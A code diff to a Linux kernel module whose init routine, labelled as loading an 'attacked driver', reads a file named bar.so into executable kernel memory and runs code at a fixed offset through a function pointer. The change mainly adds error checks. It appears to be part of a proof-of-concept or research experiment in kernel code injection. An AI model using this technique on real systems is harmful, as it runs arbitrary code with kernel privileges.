@@ -81,6 +81,7 @@ int init_module(void) {
   int size;
   int flags;
   mode_t mode;
+  int ret;
 //  int prot;
 
   printk(KERN_INFO "Starts loading the attacked driver....\n");
@@ -97,7 +98,7 @@ int init_module(void) {
 //  set_fs(KERNEL_DS);
   fd = (struct file *) kmalloc(sizeof(struct file), GFP_KERNEL);
 //  buf = kmalloc(7846, GFP_KERNEL);
-  size = 7845;
+  size = 7941;
   buf = __vmalloc(size + 1, GFP_KERNEL, PAGE_KERNEL_EXEC);
   flags = O_LARGEFILE | O_RDONLY | __FMODE_EXEC | MAY_READ | MAY_EXEC | MAY_OPEN;
   mode = 0640;
@@ -113,18 +114,19 @@ int init_module(void) {
 
   fd = file_open("bar.so", flags, mode);
   if(fd != NULL) {
-    file_read(fd, 0, buf, size);
+    if ((ret = file_read(fd, 0, buf, size)) <= 0) {
+      printk(KERN_INFO "File reading failed. ret = %d\n", ret);
+      return -1;
+    }
     file_close(fd);
+
+    printk(KERN_INFO "File readed successfully. Execution starts....\n");
+
+    /* Execute the attacking code by function pointer. */
+    bar = (void *) (buf + 0x0000000000000680);
+    s = bar();
+    printk(KERN_INFO "result: %s\n", s);
   }
-
-  /* Set protection bits. */
-//  prot = PROT_READ | PROT_WRITE | PROT_EXEC;
-//  mprotect((unsigned char *) buffer, size + 1, prot);
-
-  /* Execute the attacking code by function pointer. */
-  bar = (void *) (buf + 0x0000000000000680);
-  s = bar();
-  printk(KERN_INFO "result: %s\n", s);
 
   return 0;
 }
